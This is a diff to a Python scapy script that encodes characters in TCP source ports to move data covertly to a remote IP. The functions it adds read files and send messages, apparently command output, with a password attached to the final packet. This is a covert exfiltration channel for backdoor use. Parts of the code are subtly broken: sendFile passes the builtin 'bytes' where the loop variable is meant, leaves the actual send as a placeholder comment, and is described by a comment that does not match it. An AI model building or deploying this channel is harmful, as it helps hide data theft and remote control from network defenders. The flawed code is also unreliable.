@@ -1,4 +1,5 @@
 from scapy.all import *
+import binascii, time
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 maxPort = 65535
@@ -8,9 +9,7 @@ def chunkString(size, string):
   chunkedString = [string[i:i+size] for i in range(0, len(string), size)]
   return chunkedString
 
-# create a packet when we only have 1 character remaining in the file
-# works exactly the same as createPacketTwo except we only have one character
-# returns a TCP packet created by scapy.
+# create a packet containing one character hidden in the source port
 def createPacket(protocol, ip, char):
     # get the binary value of the character
     binChar = bin(ord(char))[2:].zfill(8)
@@ -45,3 +44,27 @@ def parsePacket(packet):
         char = chr(int(binVal, 2))
         #print "Received: " + char
         return str(char)
+
+# open a file in binary mode and return a string of the binary data
+def sendFile(ip, filePath):
+  try: # read the file byte by byte rather than reading the entire file into memory
+    with open(filePath, 'rb') as fileDescriptor:
+      while True:
+        byte = fileDescriptor.read(1)
+        if not byte:
+          break
+        # we need the '1' + ... because python will trim the leading character if it's a zero
+        byte = bin(int('1' + binascii.hexlify(bytes), 16))[3:].zfill(8)
+        # send to IP address here
+  except IOError:
+    print "file error"
+
+# we should pass the encrypted password + string (command results or something else)
+def sendMessage(message, password, protocol, ip):
+  lastIndex = len(message) - 1
+  for index, char in enumerate(message):
+    packet = createPacket(protocol, ip, char)
+    if index ==  lastIndex:
+      packet = packet/Raw(load=password)
+    send(packet, verbose=0)
+    time.sleep(0.1) # we should check if this is actually necessary
